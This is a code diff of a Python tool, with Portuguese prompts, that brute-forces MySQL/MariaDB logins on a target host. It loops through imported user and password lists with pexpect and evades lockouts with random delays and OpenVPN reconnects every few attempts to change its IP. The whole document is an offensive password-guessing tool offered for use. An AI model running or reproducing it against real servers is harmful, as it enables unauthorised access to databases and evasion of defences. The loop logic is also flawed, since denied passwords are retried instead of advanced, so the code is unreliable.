@@ -3,13 +3,15 @@ import random
 import passwords
 import time
 import vpn
+import users
 
-passwords = passwords.passwords_
+passwordsl = passwords.passwords_
+usersl = users.users_
 openvpn_enter = vpn.openvpn_enter_()
 
 finded = False
 
-i = 0
+j = 0
 
 LOGIN_SUCCESS_MARIADB = 0
 LOGIN_SUCCESS_MYSQL = 1
@@ -17,66 +19,110 @@ LOGIN_DENIED = 2
 END = 3
 TIMEOUT = 4
 
-i = int(input("Qual o valor inicial: "))
+i = int(input("Qual o valor inicial do usuário: "))
+j = int(input("Qual o valor inicial da senha: "))
 
-user = input("Qual o usuário: ")
 destino = input("Qual o destino: ")
 
 next_ = random.randint(30, 45)
 next5 = 5
 
-while i < len(passwords):
+tries_exceeded = 0
 
-    with open("/tmp/mysql_i", "w") as f:
-        f.write(str(i))
+while i < len(usersl):
 
-    process = pexpect.spawn("mysql", ["-u", user, "-p", destino], encoding="utf-8", timeout=10)
+    with open("/tmp/status", "r") as f:
+        lines = f.readlines()
 
-    process.expect("Enter password:")
-    process.sendline(str(passwords[i]))
+    lines[1] = f"{i}\n"
 
-    result = process.expect([
-        "MariaDB",
-        "mysql",
-        "ERROR 1698",
-        pexpect.EOF,
-        pexpect.TIMEOUT,
-    ])
+    with open("/tmp/status", "w") as f:
+        f.writelines(lines)
 
-    if result in (LOGIN_SUCCESS_MARIADB, LOGIN_SUCCESS_MYSQL):
-        password = passwords[i]
-        print(password)
+    while j < len(passwordsl):
 
-        finded = True
+        with open("/tmp/status", "r") as f:
+            lines = f.readlines()
+    
+        lines[2] = f"{j}\n"
 
-        with open("/tmp/mysql_finded", "w") as f:
-            f.write("True")
+        with open("/tmp/status", "w") as f:
+            f.writelines(lines)
 
-        break
+        process = pexpect.spawn("mysql", ["-u", usersl[i], "-p", destino], encoding="utf-8", timeout=10)
 
-    if result == LOGIN_DENIED:
-        print("Senha recusada pelo MySQL.")
-    elif result == END:
-        print("A conexão com o MySQL foi encerrada.")
-    elif result == TIMEOUT:
-        print("Tempo limite aguardando a resposta do MySQL.")
+        process.expect("Enter password:")
+        process.sendline(str(passwordsl[j]))
 
-    if i == next_:
-        time.sleep(random.randint(15, 20))
-        next_ += random.randint(35, 55)
+        result = process.expect([
+            "MariaDB",
+            "mysql",
+            "ERROR 1698",
+            pexpect.EOF,
+            pexpect.TIMEOUT,
+        ])
 
-    delay = random.randint(1, 3)
-    time.sleep(delay)
+        if result in (LOGIN_SUCCESS_MARIADB, LOGIN_SUCCESS_MYSQL):
+            password = passwordsl[j]
+            print(password)
 
-    if result in (LOGIN_DENIED, END, TIMEOUT):
-        process.close()
-        i += 1
+            finded = True
 
-        if i >= next5:
+            with open("/tmp/status", "r") as f:
+                lines = f.readlines()
+            
+            lines[3] = "True\n"
+
+            with open("/tmp/status", "w") as f:
+                f.writelines(lines)
+
+            break
+
+        if result == LOGIN_DENIED:
+            print("Senha recusada pelo MySQL.")
+        elif result == END:
+            print("A conexão com o MySQL foi encerrada.")
+        elif result == TIMEOUT:
+            print("Tempo limite aguardando a resposta do MySQL.")
+
+        if j == next_:
+            time.sleep(random.randint(15, 20))
+            next_ += random.randint(35, 55)
+
+        delay = random.randint(1, 3)
+        time.sleep(delay)
+
+
+        if result in (LOGIN_DENIED, END, TIMEOUT):
+            tries_exceeded += 1
+
+            if tries_exceeded >= 15:
+                with open("/tmp/status", "r") as f:
+                    lines = f.readlines()
+                
+                lines[4] = "Muitas tentativas falhadas. Arquivo encerrado\n"
+
+                with open("/tmp/status", "w") as f:
+                    f.writelines(lines)
+
+                print("Muitas tentativas falhadas. Encerrando...")
+                break
+
+            process.close()
+            continue
+
+        tries_exceeded = 0
+        
+        if j >= next5:
             openvpn_enter.close()
             openvpn_enter = vpn.openvpn_enter_()
             next5 += 5
 
-        continue
+        j += 1
+
+    i += 1
+
+    if tries_exceeded >= 15:
+        break
 
 openvpn_enter.close()
